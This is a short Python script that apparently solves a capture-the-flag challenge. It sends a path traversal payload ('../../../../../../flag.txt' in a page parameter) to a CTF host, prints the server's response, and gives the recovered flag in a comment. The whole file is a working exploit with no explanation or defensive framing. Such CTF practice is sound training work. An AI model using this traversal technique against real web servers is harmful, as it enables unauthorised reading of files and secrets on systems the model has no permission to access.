import requests

url = 'http://recruit.osiris.bar:32003'

response = requests.get(f"{url}/?page=../../../../../../flag.txt")
print(response.text)

# flag{thx_t0_Eg1003_F0r_be1N'_4n_ex4MPlE}
